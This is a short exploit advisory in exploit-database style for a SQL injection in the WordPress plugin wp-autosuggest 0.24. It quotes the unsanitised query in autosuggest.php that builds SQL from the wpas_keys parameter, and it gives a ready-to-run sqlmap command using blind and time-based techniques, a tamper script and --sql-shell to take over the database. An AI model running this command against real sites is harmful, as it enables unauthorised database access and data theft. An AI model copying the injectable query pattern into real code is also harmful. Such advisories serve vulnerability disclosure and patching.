# Exploit Author: Kaimi
# Website: https://kaimi.io
# Version: 0.24
# Category: webapps

SQL Injection
File: autosuggest.php

Vulnerable code:
if (isset($_GET[&#039;wpas_keys&#039;])) {
	$wpas_keys = $_GET[&#039;wpas_keys&#039;];
}
...
$wpas_keys = str_replace(&#039; &#039;,&#039;%&#039;,$wpas_keys);
	$pageposts = $wpdb->get_results("SELECT * FROM $wpdb->posts WHERE (post_title LIKE &#039;%$wpas_keys%&#039;) AND post_status = &#039;publish&#039; ORDER BY post_date DESC");


Exploitation example:

sqlmap -u "http://URL/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --sql-shell

